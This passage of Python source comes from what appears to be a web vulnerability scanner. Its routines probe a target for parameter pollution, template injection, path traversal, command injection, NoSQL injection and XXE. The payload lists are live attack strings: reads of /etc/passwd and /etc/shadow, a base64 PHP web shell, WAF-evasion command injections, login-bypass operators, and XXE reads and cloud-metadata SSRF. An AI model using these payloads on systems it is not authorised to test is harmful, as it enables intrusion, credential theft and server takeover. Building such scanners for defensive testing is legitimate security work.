                            "proof": {
                                "payload": payload,
                                "discriminating_response": True,
                                "response_snippet": body[:200],
                            },
                            "remediation": [
                                "Return the same generic message for both valid and invalid accounts",
                                "Use consistent response times to prevent timing-based enumeration",
                            ],
                        })
                        break
            except Exception as exc:
                logger.debug("[Logic] Email enumeration test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: HTTP Parameter Pollution                                      #
    # ------------------------------------------------------------------ #

    async def _test_http_parameter_pollution(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test HTTP Parameter Pollution - send the same parameter twice with
        different values. A vulnerable server may use the second value to
        bypass access controls or business logic.
        """
        flaws = []
        test_paths = [
            "/api/transfer", "/api/payment", "/api/orders",
            "/api/users/me", "/api/v1/transfer",
        ]

        for path in test_paths:
            url = self.target + path
            # Send amount=1 twice - second value might override validation
            polluted_url = f"{url}?amount=1&amount=99999"
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(polluted_url, json={"amount": 1}) as resp:
                    if resp.status in (200, 201):
                        body = await resp.text(errors="replace")
                        if "99999" in body:
                            flaws.append({
                                "type": "http_parameter_pollution",
                                "endpoint": url,
                                "method": "POST",
                                "severity": "HIGH",
                                "description": f"HTTP parameter pollution at {path}: second 'amount' parameter value reflected - business logic may be bypassable.",
                                "proof": {
                                    "polluted_url": polluted_url,
                                    "reflected_value": "99999",
                                    "response_status": resp.status,
                                },
                                "remediation": [
                                    "Parse only the first (or last) occurrence of duplicate parameters",
                                    "Validate amounts server-side against the canonical request body value",
                                ],
                            })
                            break
            except Exception as exc:
                logger.debug("[Logic] HPP test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Server-Side Template Injection (SSTI)                        #
    # ------------------------------------------------------------------ #

    # Use large unique multipliers - results are unlikely to appear naturally in any page
    _SSTI_PROBES = [
        # (payload, expected_fragment, engine_hint)
        # Only probes whose expected values are highly specific and unlikely to appear by chance
        ("{{1337*1337}}",                             "1787569",      "Jinja2/Twig"),
        ("${1337*1337}",                              "1787569",      "Freemarker/Spring EL"),
        ("<%= 1337*1337 %>",                          "1787569",      "ERB/JSP"),
        ("#{1337*1337}",                              "1787569",      "Ruby/Mako"),
        ("{{7*'7'}}",                                 "7777777",      "Jinja2 string multiply"),
        ("{1337*1337}",                               "1787569",      "Go/Smarty"),
        ("${\"freemarker\".toUpperCase()}",            "FREEMARKER",   "Freemarker method call"),
        ("<#assign x=1337*1337>${x}",                 "1787569",      "Freemarker assign"),
        ("[[${1337*1337}]]",                          "1787569",      "Thymeleaf inline"),
        ("*{T(Integer).MAX_VALUE}",                   "2147483647",   "Spring SpEL T()"),
        ("#set($x=1337*1337)$x",                      "1787569",      "Velocity"),
        ("%{1337*1337}",                              "1787569",      "Struts OGNL"),
        ("${{1337*1337}}",                            "1787569",      "Angular expression"),
    ]

    # Cache baseline bodies keyed by (url, param) to avoid redundant requests
    _ssti_baselines: Dict[str, str] = {}

    async def _test_ssti(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect Server-Side Template Injection with baseline differential analysis.

        For each (url, param) pair:
          1. Fetch a baseline response (safe value) and record the body.
          2. Inject the SSTI payload.
          3. Only flag if the expected result appears in the injected response
             AND is absent from the baseline - eliminating numbers that appear
             naturally on the page (prices, IDs, dates, etc.).
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_SSTI_REQUESTS = int(self.config.get("max_ssti_requests", 300))
        total = 0

        SSTI_PARAMS = ["page", "template", "view", "name", "q", "search", "lang",
                       "msg", "redirect", "url", "next", "content", "title", "input"]
        SSTI_PATHS = ["/search", "/page", "/render", "/template", "/", "/api/render",
                      "/api/template", "/api/search"]

        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in SSTI_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        # Apply Think Engine selection if active
        active_probes = self._SSTI_PROBES
        if self._think_engine:
            probe_values = [p for p, _, _ in self._SSTI_PROBES]
            selected = set(self._think_select("ssti", probe_values))
            active_probes = [(p, e, h) for p, e, h in self._SSTI_PROBES if p in selected]
            logger.debug("[Think/SSTI] %d/%d probes selected", len(active_probes), len(self._SSTI_PROBES))

        baselines: Dict[str, str] = {}  # (url, param) → baseline body

        for path in paths:
            if total >= MAX_SSTI_REQUESTS:
                break
            url = self.target + path

            for param in SSTI_PARAMS[:8]:
                if total >= MAX_SSTI_REQUESTS:
                    break
                # ── Step 1: fetch baseline with a safe benign value ──
                baseline_key = f"{url}|{param}"
                if baseline_key not in baselines:
                    try:
                        baseline_url = f"{url}?{param}=hello"
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(baseline_url) as resp:
                            baselines[baseline_key] = (
                                await resp.text(errors="replace") if resp.status == 200 else ""
                            )
                        total += 1
                    except Exception:
                        baselines[baseline_key] = ""

                baseline_body = baselines[baseline_key]

                # ── Step 2: inject each payload and compare ──
                for payload, expected, engine in active_probes:
                    if total >= MAX_SSTI_REQUESTS:
                        break
                    if not expected:
                        continue  # skip probes with no verifiable output

                    key = (url, param, engine)
                    if key in confirmed:
                        continue

                    # Skip if the expected value already exists in baseline
                    # (it's just static content on the page, not template evaluation)
                    if expected and expected in baseline_body:
                        continue

                    try:
                        ssti_url = f"{url}?{param}={payload}"
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(ssti_url) as resp:
                            body = await resp.text(errors="replace") if resp.status == 200 else ""
                            _ssti_status = resp.status
                            _ssti_headers = dict(resp.headers)
                        total += 1

                        # Confirmed only if expected appears in injected response
                        # and did NOT appear in baseline
                        if body and expected in body and expected not in baseline_body:
                            confirmed.add(key)
                            flaws.append({
                                "type": "ssti",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": (
                                    f"SSTI ({engine}) at {path}?{param}=: "
                                    f"payload '{payload}' evaluated server-side, "
                                    f"result '{expected}' found in response but absent from baseline."
                                ),
                                "proof": {
                                    "param": param,
                                    "payload": payload,
                                    "expected_result": expected,
                                    "engine_hint": engine,
                                    "baseline_url": f"{url}?{param}=hello",
                                    "baseline_contained_result": False,
                                },
                                "evidence": build_evidence(
                                    method="GET",
                                    url=ssti_url,
                                    resp_status=_ssti_status,
                                    resp_headers=_ssti_headers,
                                    resp_body=body[:2000],
                                ),
                                "remediation": [
                                    "Never pass user input directly to template engines.",
                                    "Use sandboxed rendering or escape all user-controlled data.",
                                    "Disable dangerous template functions (config access, popen, etc.).",
                                ],
                            })
                            break  # one confirmed finding per (url, param) is enough
                    except Exception as exc:
                        logger.debug("[Logic] SSTI GET %s?%s: %s", url, param, exc)

        logger.info("[Logic] SSTI scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Path Traversal / Local File Inclusion                         #
    # ------------------------------------------------------------------ #

    _LFI_PAYLOADS = [
        # Classic depth variants
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "../../../../../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../../../../../etc/passwd",
        # URL-encoded and double-encoded
        "..%2F..%2F..%2Fetc%2Fpasswd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252F..%252F..%252Fetc%252Fpasswd",
        # Slash confusion
        "....//....//....//etc/passwd",
        "..././..././..././etc/passwd",
        # UTF-8 overlong slash bypass
        "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
        "..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
        # Null byte (legacy PHP / CGI)
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.png",
        # Sensitive Linux files
        "../../../etc/shadow",
        "../../../etc/hosts",
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        # Proc filesystem
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/maps",
        "/proc/version",
        "/proc/self/fd/0",
        # PHP stream wrappers
        "php://filter/convert.base64-encode/resource=/etc/passwd",
        "php://filter/read=convert.base64-encode/resource=/etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=../config.php",
        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
        "expect://id",
        "zip://shell.jpg%23shell.php",
        # Windows
        "../../../windows/win.ini",
        "../../../boot.ini",
        "C:\\Windows\\win.ini",
        "....\\....\\....\\windows\\win.ini",
        "..%5C..%5C..%5Cwindows%5Cwin.ini",
        "C:/Windows/System32/drivers/etc/hosts",
        "C:/inetpub/wwwroot/web.config",
        # UNC (Windows shared path bypass)
        "\\\\localhost\\C$\\Windows\\win.ini",
    ]
    _LFI_SIGNATURES = [
        "root:x:0:0", "bin:x:", "/bin/bash", "/bin/sh",
        "[boot loader]", "[fonts]", "for 16-bit",
        "127.0.0.1", "localhost",
    ]

    async def _test_path_traversal(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect path traversal / LFI by injecting directory traversal sequences
        into file/path-related GET parameters.
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_LFI_REQUESTS = int(self.config.get("max_lfi_requests", 300))
        total = 0

        LFI_PARAMS = ["file", "path", "page", "include", "template", "view",
                      "filename", "doc", "download", "load", "resource", "src",
                      "href", "url", "dir", "folder", "location", "route"]

        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        HARDCODED_LFI_PATHS = ["/api/file", "/api/download", "/api/load", "/download",
                                "/file", "/static", "/media", "/assets", "/api/export"]
        for p in HARDCODED_LFI_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        for path in paths:
            if total >= MAX_LFI_REQUESTS:
                break
            url = self.target + path
            for payload in self._LFI_PAYLOADS:
                if total >= MAX_LFI_REQUESTS:
                    break
                for param in LFI_PARAMS[:10]:
                    key = (url, param)
                    if key in confirmed or total >= MAX_LFI_REQUESTS:
                        break
                    try:
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(f"{url}?{param}={payload}") as resp:
                            body = await resp.text(errors="replace") if resp.status == 200 else ""
                        total += 1
                        if body and any(sig in body for sig in self._LFI_SIGNATURES):
                            confirmed.add(key)
                            flaws.append({
                                "type": "path_traversal",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": (
                                    f"Path traversal at {path}?{param}=: "
                                    f"payload '{payload}' returned system file content."
                                ),
                                "proof": {
                                    "param": param,
                                    "payload": payload,
                                    "response_snippet": body[:300],
                                },
                                "remediation": [
                                    "Resolve and canonicalize file paths using Path.resolve().",
                                    "Reject paths containing '..' or absolute path components.",
                                    "Use an allowlist of permitted directories only.",
                                    "Never pass user-controlled values to file-reading functions.",
                                ],
                            })
                            break
                    except Exception as exc:
                        logger.debug("[Logic] LFI GET %s?%s: %s", url, param, exc)

        logger.info("[Logic] LFI scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Command Injection                                             #
    # ------------------------------------------------------------------ #

    _CMDI_PAYLOADS = [
        # Output-based - Linux standard operators
        ("; id",                    ["uid=", "gid="],                          "semicolon"),
        ("$(id)",                   ["uid=", "gid="],                          "subshell"),
        ("`id`",                    ["uid=", "gid="],                          "backtick"),
        ("| id",                    ["uid=", "gid="],                          "pipe"),
        ("|| id",                   ["uid=", "gid="],                          "or-pipe"),
        ("&& id",                   [r"uid=\d+\(", r"gid=\d+\("],             "double-and"),
        ("& id",                    [r"uid=\d+\(", r"gid=\d+\("],             "background"),
        ("\n id",                   [r"uid=\d+\(", r"gid=\d+\("],             "newline"),
        # whoami variants - use specific patterns that only appear in command output
        ("; whoami",                [r"^(root|www-data|daemon|nobody|apache|nginx|ubuntu|centos)$"],  "whoami"),
        ("$(whoami)",               [r"^(root|www-data|daemon|nobody)$"],                            "whoami-subshell"),
        ("| whoami",                [r"^(root|www-data|daemon|nobody)$"],                            "whoami-pipe"),
        # File read - root:x:0:0 is highly specific
        ("; cat /etc/passwd",       [r"root:[x*]:0:0:"],                       "cat-passwd"),
        ("| cat /etc/passwd",       [r"root:[x*]:0:0:"],                       "cat-passwd-pipe"),
        ("$(cat /etc/passwd)",      [r"root:[x*]:0:0:"],                       "cat-passwd-subshell"),
        # IFS / variable substitution bypass (WAF evasion)
        ("${IFS}id",                [r"uid=\d+\(", r"gid=\d+\("],             "ifs-subst"),
        (";${IFS}id",               [r"uid=\d+\(", r"gid=\d+\("],             "ifs-semi"),
        (";$IFS$9id",               [r"uid=\d+\(", r"gid=\d+\("],             "ifs9"),
        # URL-encoded operators
        ("%0a id",                  [r"uid=\d+\(", r"gid=\d+\("],             "url-newline"),
        ("%3b id",                  [r"uid=\d+\(", r"gid=\d+\("],             "url-semi"),
        # Base64 decode bypass
        ("$(echo aWQ= | base64 -d | sh)", [r"uid=\d+\("],                     "b64-decode"),
        # Time-based (delay confirms blind injection)
        ("; sleep 3",               [],                                         "time-delay"),
        ("$(sleep 3)",              [],                                         "time-delay-subshell"),
        ("| sleep 3",               [],                                         "time-delay-pipe"),
        ("$(ping -c 3 127.0.0.1)",  [],                                         "ping-subshell"),
        ("1; ping -c 3 127.0.0.1",  [],                                         "ping-delay"),
        # Windows operators - "nt authority\" is highly specific, "system" alone is NOT
        ("& whoami",                [r"nt authority\\", r"\\administrator$"],   "win-and"),
        ("| whoami",                [r"nt authority\\", r"\\administrator$"],   "win-pipe"),
        ("&& whoami",               [r"nt authority\\", r"\\administrator$"],   "win-double-and"),
        ("; dir C:\\",              [r"Directory of C:\\", r"\d+ File\(s\)"],   "win-dir"),
        ("& dir C:\\",              [r"Directory of C:\\", r"\d+ File\(s\)"],   "win-dir-and"),
        ("& type C:\\Windows\\win.ini", [r"\[fonts\]", r"\[boot loader\]"],    "win-type"),
        # PowerShell
        ("; powershell -c whoami",  [r"nt authority\\"],                        "powershell"),
        ("|powershell -c whoami",   [r"nt authority\\"],                        "ps-pipe"),
    ]

    # Compiled regexes for payload markers (built once, used per detection)
    _CMDI_MARKER_RE: Dict[str, re.Pattern] = {}

    async def _test_command_injection(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect OS command injection via output-based and time-based techniques.
        Tests GET parameters commonly used in server-side shell operations.
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_CMDI_REQUESTS = int(self.config.get("max_cmdi_requests", 250))
        total = 0

        CMDI_PARAMS = ["cmd", "exec", "command", "ping", "host", "domain", "ip",
                       "url", "target", "input", "query", "shell", "run", "process",
                       "addr", "address", "hostname"]

        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                from urllib.parse import urlparse
                p = urlparse(disc_url).path.rstrip("/") or "/"
                if p not in seen and self._is_dynamic_path(p):
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        HARDCODED_CMDI_PATHS = ["/api/ping", "/api/nslookup", "/api/exec", "/api/run",
                                 "/api/scan", "/api/traceroute", "/api/whois", "/api/dig"]
        for p in HARDCODED_CMDI_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        # Build compiled regex patterns once - map technique → compiled re
        if not self._CMDI_MARKER_RE:
            for _, _markers, _tech in self._CMDI_PAYLOADS:
                if _markers and _tech not in self.__class__._CMDI_MARKER_RE:
                    self.__class__._CMDI_MARKER_RE[_tech] = re.compile(
                        "|".join(_markers), re.MULTILINE
                    )

        # Per (url, param) baseline cache: (body_lower, elapsed)
        cmdi_baselines: Dict[str, tuple] = {}

        for path in paths:
            if total >= MAX_CMDI_REQUESTS:
                break
            url = self.target + path
            for payload, markers, technique in self._CMDI_PAYLOADS:
                if total >= MAX_CMDI_REQUESTS:
                    break
                marker_re = self._CMDI_MARKER_RE.get(technique)
                is_time_based = not markers and (
                    technique.startswith("time") or technique.startswith("ping")
                )
                for param in CMDI_PARAMS[:8]:
                    key = (url, param, technique)
                    if key in confirmed or total >= MAX_CMDI_REQUESTS:
                        break
                    try:
                        # Lazy-fetch baseline once per (url, param)
                        baseline_key = f"{url}|{param}"
                        if baseline_key not in cmdi_baselines:
                            try:
                                await asyncio.sleep(self.rate_limit)
                                t_b = _time.monotonic()
                                async with session.get(f"{url}?{param}=1") as br:
                                    b_elapsed = _time.monotonic() - t_b
                                    b_body = await br.text(errors="replace") if br.status in (200, 500) else ""
                                total += 1
                                cmdi_baselines[baseline_key] = (b_body.lower(), b_elapsed)
                            except Exception:
                                cmdi_baselines[baseline_key] = ("", 0.0)
                        baseline_body_l, baseline_time = cmdi_baselines[baseline_key]

                        await asyncio.sleep(self.rate_limit)
                        t0 = _time.monotonic()
                        async with session.get(f"{url}?{param}={payload}") as resp:
                            elapsed = _time.monotonic() - t0
                            body = await resp.text(errors="replace") if resp.status in (200, 500) else ""
                        total += 1

                        # Time-based detection - threshold relative to baseline
                        if is_time_based:
                            time_threshold = max(2.5, baseline_time + 2.0)
                            if elapsed >= time_threshold:
                                confirmed.add(key)
                                flaws.append({
                                    "type": "command_injection",
                                    "technique": "time_blind",
                                    "endpoint": url,
                                    "method": "GET",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Time-based command injection at {path}?{param}=: "
                                        f"payload '{payload}' caused {elapsed:.1f}s delay "
                                        f"(baseline {baseline_time:.1f}s)."
                                    ),
                                    "proof": {
                                        "param": param, "payload": payload,
                                        "delay_seconds": round(elapsed, 2),
                                        "baseline_seconds": round(baseline_time, 2),
                                    },
                                    "remediation": [
                                        "Never pass user input to shell functions (os.system, subprocess, exec).",
                                        "Use parameterized API calls instead of shell commands.",
                                        "Apply strict input allowlisting if shell calls are unavoidable.",
                                    ],
                                })
                                break

                        # Output-based detection - regex match, verified not in baseline
                        if marker_re and body:
                            m = marker_re.search(body)
                            if m and not marker_re.search(baseline_body_l):
                                matched_text = m.group(0)[:120]
                                confirmed.add(key)
                                flaws.append({
                                    "type": "command_injection",
                                    "technique": "output_based",
                                    "endpoint": url,
                                    "method": "GET",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"OS command injection at {path}?{param}=: "
                                        f"command output '{matched_text}' detected in response."
                                    ),
                                    "proof": {
                                        "param": param, "payload": payload,
                                        "matched_output": matched_text,
                                        "response_snippet": body[:300],
                                    },
                                    "remediation": [
                                        "Never pass user input to shell functions.",
                                        "Use parameterized API calls instead of shell commands.",
                                        "Apply strict input allowlisting if shell calls are unavoidable.",
                                    ],
                                })
                                break
                    except Exception as exc:
                        logger.debug("[Logic] CMDi GET %s?%s: %s", url, param, exc)

        logger.info("[Logic] CMDi scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: NoSQL Injection                                               #
    # ------------------------------------------------------------------ #

    _NOSQL_GET_PAYLOADS = [
        ("[$ne]",             "1",                          "ne comparison bypass"),
        ("[$gt]",             "",                           "gt greater-than bypass"),
        ("[$regex]",          ".*",                         "regex wildcard match"),
        ("[$where]",          "function(){return true}",   "JS where clause"),
        ("[$exists]",         "true",                       "field existence"),
        ("[$in][0]",          "admin",                      "in-array admin"),
        ("[$in][1]",          "root",                       "in-array root"),
        ("[$not][$lt]",       "9999",                       "not-less-than"),
        ("[$mod][0]",         "0",                          "modulo bypass"),
        ("[$type]",           "2",                          "type-string"),
        ("[$text][$search]",  "admin",                      "full-text search"),
        ("[$or][0][password][$gt]", "",                     "or-password-gt"),
    ]
    _NOSQL_POST_PAYLOADS = [
        ({"$ne": None},                                    "ne null"),
        ({"$gt": ""},                                      "gt empty string"),
        ({"$regex": ".*"},                                 "regex wildcard"),
        ({"$where": "function(){return true}"},            "js where clause"),
        ({"$nin": []},                                     "nin empty array"),
        ({"$in": ["admin", "root", "administrator"]},      "in array"),
        ({"$or": [{"password": {"$exists": True}}]},       "or exists"),
        ({"$and": [{"username": {"$ne": ""}}]},            "and ne empty"),
        ({"$not": {"$eq": None}},                          "not eq null"),
        ({"$expr": {"$eq": ["$username", "admin"]}},       "expr aggregation"),
        ({"$elemMatch": {"$exists": True}},                "elemMatch exists"),
    ]
    _NOSQL_ERRORS = [
        "bson", "mongodb", "mongoose", "mongod", "nosql",
        "cast to objectid", "objectid failed", "invalid bson",
        "syntaxerror", "$where", "\\$ne",
    ]

    # Static file extensions that cannot be vulnerable to injection attacks
    _STATIC_EXTENSIONS = frozenset({
        ".js", ".css", ".map", ".png", ".jpg", ".jpeg", ".gif", ".svg",
        ".ico", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".webp",
        ".mp4", ".mp3", ".pdf", ".zip", ".gz", ".br", ".xml",
    })

    async def _test_nosql_injection(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Detect NoSQL injection via operator injection.
        Detection requires a baseline comparison - a 200 on the injected
        request is ONLY meaningful if the baseline (no operator) returned
        401/403 (auth bypass) or if the response body contains a DB error
        absent from the baseline (error-based).
        """
        flaws: List[Dict[str, Any]] = []
        confirmed: set = set()
        MAX_NOSQL_REQUESTS = int(self.config.get("max_nosql_requests", 200))
        total = 0

        NOSQL_PARAMS = ["username", "email", "id", "user_id", "name", "token",
                        "q", "search", "filter", "password", "key"]
        HARDCODED_PATHS = ["/api/login", "/api/auth/login", "/api/users",
                           "/api/search", "/api/auth/token", "/api/v1/users"]

        from urllib.parse import urlparse
        seen: set = set()
        paths: List[str] = []
        for disc_url in self._discovered_endpoints:
            try:
                parsed = urlparse(disc_url)
                p = parsed.path.rstrip("/") or "/"
                # Skip static assets - they can never be vulnerable to injection
                ext = "." + p.rsplit(".", 1)[-1].lower() if "." in p.split("/")[-1] else ""
                if ext in self._STATIC_EXTENSIONS:
                    continue
                if p not in seen:
                    seen.add(p)
                    paths.append(p)
            except Exception:
                pass
        for p in HARDCODED_PATHS:
            if p not in seen:
                seen.add(p)
                paths.append(p)

        # Per (url, param) baseline cache: (status, body_lower)
        nosql_baselines: Dict[str, tuple] = {}

        for path in paths:
            if total >= MAX_NOSQL_REQUESTS:
                break
            url = self.target + path

            # GET: operator injection via bracket notation
            for (suffix, val, technique) in self._NOSQL_GET_PAYLOADS:
                if total >= MAX_NOSQL_REQUESTS:
                    break
                for param in NOSQL_PARAMS[:6]:
                    key = (url, param, technique)
                    if key in confirmed or total >= MAX_NOSQL_REQUESTS:
                        break

                    # Fetch baseline once per (url, param)
                    baseline_key = f"{url}|{param}"
                    if baseline_key not in nosql_baselines:
                        try:
                            await asyncio.sleep(self.rate_limit)
                            async with session.get(f"{url}?{param}=safe_value") as br:
                                b_body = await br.text(errors="replace") if br.status in (200, 400, 401, 403, 500) else ""
                            total += 1
                            nosql_baselines[baseline_key] = (br.status, b_body.lower())
                        except Exception:
                            nosql_baselines[baseline_key] = (0, "")

                    baseline_status, baseline_body_l = nosql_baselines[baseline_key]

                    test_url = f"{url}?{param}{suffix}={val}"
                    try:
                        await asyncio.sleep(self.rate_limit)
                        async with session.get(test_url) as resp:
                            body = await resp.text(errors="replace") if resp.status in (200, 400, 401, 403, 500) else ""
                        total += 1
                        body_lower = body.lower()

                        # Auth bypass: endpoint was protected (401/403) but operator unlocked it
                        if baseline_status in (401, 403) and resp.status == 200:
                            confirmed.add(key)
                            flaws.append({
                                "type": "nosql_injection",
                                "technique": technique,
                                "endpoint": url,
                                "method": "GET",
                                "severity": "CRITICAL",
                                "description": (
                                    f"NoSQL auth bypass ({technique}) at {path}?{param}{suffix}=: "
                                    f"baseline returned {baseline_status}, operator injection returned 200."
                                ),
                                "proof": {
                                    "url": test_url,
                                    "baseline_status": baseline_status,
                                    "injected_status": resp.status,
                                    "response_snippet": body[:300],
                                },
                                "remediation": [
                                    "Sanitize and type-check all query inputs server-side.",
                                    "Reject query operator keys ($ne, $gt, $where, etc.) in user input.",
                                    "Use strict schema validation (Joi, Mongoose schema types).",
                                ],
                            })
                            break

                        # Error-based: DB error in response but not in baseline
                        matched_err = next(
                            (e for e in self._NOSQL_ERRORS
                             if e in body_lower and e not in baseline_body_l),
                            None,
                        )
                        if matched_err:
                            confirmed.add(key)
                            flaws.append({
                                "type": "nosql_injection",
                                "technique": "error_based",
                                "endpoint": url,
                                "method": "GET",
                                "severity": "HIGH",
                                "description": (
                                    f"NoSQL error-based injection at {path}?{param}{suffix}=: "
                                    f"database error '{matched_err}' leaked in response."
                                ),
                                "proof": {
                                    "url": test_url,
                                    "matched_error": matched_err,
                                    "response_snippet": body[:300],
                                },
                                "remediation": [
                                    "Sanitize and type-check all query inputs server-side.",
                                    "Suppress detailed database error messages in production.",
                                ],
                            })
                            break
                    except Exception as exc:
                        logger.debug("[Logic] NoSQLi GET %s: %s", test_url, exc)

            # POST: operator injection in JSON body
            if total >= MAX_NOSQL_REQUESTS:
                break
            for (op_val, technique) in self._NOSQL_POST_PAYLOADS:
                if total >= MAX_NOSQL_REQUESTS:
                    break
                for field in ["username", "email", "password"]:
                    key = (url, field, "post_" + technique)
                    if key in confirmed or total >= MAX_NOSQL_REQUESTS:
                        break

                    # Baseline POST: normal string value
                    post_baseline_key = f"{url}|POST|{field}"
                    if post_baseline_key not in nosql_baselines:
                        try:
                            await asyncio.sleep(self.rate_limit)
                            async with session.post(
                                url, json={field: "safe_string", "password": "wrongpassword"}
                            ) as br:
                                b_body = await br.text(errors="replace") if br.status in (200, 201, 400, 401, 403, 500) else ""
                            total += 1
                            nosql_baselines[post_baseline_key] = (br.status, b_body.lower())
                        except Exception:
                            nosql_baselines[post_baseline_key] = (0, "")

                    post_baseline_status, _ = nosql_baselines[post_baseline_key]

                    body_payload = {field: op_val, "password": "anypassword"}
                    try:
                        await asyncio.sleep(self.rate_limit)
                        async with session.post(url, json=body_payload) as resp:
                            body = await resp.text(errors="replace") if resp.status in (200, 201, 400, 401, 403, 500) else ""
                        total += 1

                        # Auth bypass: normal login fails (401/403/400) but operator succeeds (200/201)
                        if post_baseline_status in (400, 401, 403) and resp.status in (200, 201):
                            confirmed.add(key)
                            flaws.append({
                                "type": "nosql_injection",
                                "technique": "auth_bypass_post",
                                "endpoint": url,
                                "method": "POST",
                                "severity": "CRITICAL",
                                "description": (
                                    f"NoSQL auth bypass at {path} [field: {field}]: "
                                    f"operator '{technique}' bypassed authentication "
                                    f"(baseline {post_baseline_status} → injected {resp.status})."
                                ),
                                "proof": {
                                    "field": field,
                                    "payload": str(op_val),
                                    "baseline_status": post_baseline_status,
                                    "injected_status": resp.status,
                                },
                                "remediation": [
                                    "Reject non-string values in authentication fields.",
                                    "Validate input types strictly before passing to database queries.",
                                ],
                            })
                            break
                    except Exception as exc:
                        logger.debug("[Logic] NoSQLi POST %s[%s]: %s", url, field, exc)

        logger.info("[Logic] NoSQLi scan: %d findings (%d reqs)", len(flaws), total)
        return flaws

    # ------------------------------------------------------------------ #
    #  Test: XXE (XML External Entity Injection)                           #
    # ------------------------------------------------------------------ #

    _XXE_PAYLOADS = [
        # Linux file read
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>',
         ["root:x:0:0", "bin:x:", "/bin/bash"], "Linux passwd read"),
        # Linux /etc/hosts
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><x>&xxe;</x>',
         ["127.0.0.1", "localhost"], "Linux hosts read"),
        # /proc/self/environ
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><x>&xxe;</x>',
         ["PATH=", "HOME=", "USER="], "Linux environ read"),
        # Windows file read
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><x>&xxe;</x>',
         ["[fonts]", "[boot loader]", "for 16-bit"], "Windows win.ini read"),
        # Windows web.config read
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/inetpub/wwwroot/web.config">]><x>&xxe;</x>',
         ["connectionString", "appSettings", "<configuration>"], "Windows web.config read"),
        # Error-based (reveals path in error)
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///nonexistent_ds1hunter">]><x>&xxe;</x>',
         ["nonexistent_ds1hunter", "failed to open", "no such file"], "Error-based path disclosure"),
        # SSRF via XXE - AWS
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>',
         ["ami-id", "instance-id", "security-credentials"], "AWS metadata SSRF"),
        # SSRF via XXE - GCP
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/"]>]><x>&xxe;</x>',
         ["project-id", "instance-id"], "GCP metadata SSRF"),
        # OOB via parameter entity (blind XXE)
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://ds1h-xxe-oob.invalid/"> %xxe;]><x>oob</x>',
         ["oob"], "OOB parameter entity (blind)"),
        # CDATA exfiltration bypass
        ('<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x><![CDATA[&xxe;]]></x>',
         ["root:x:0:0", "bin:x:"], "CDATA bypass"),
        # Attribute-based injection
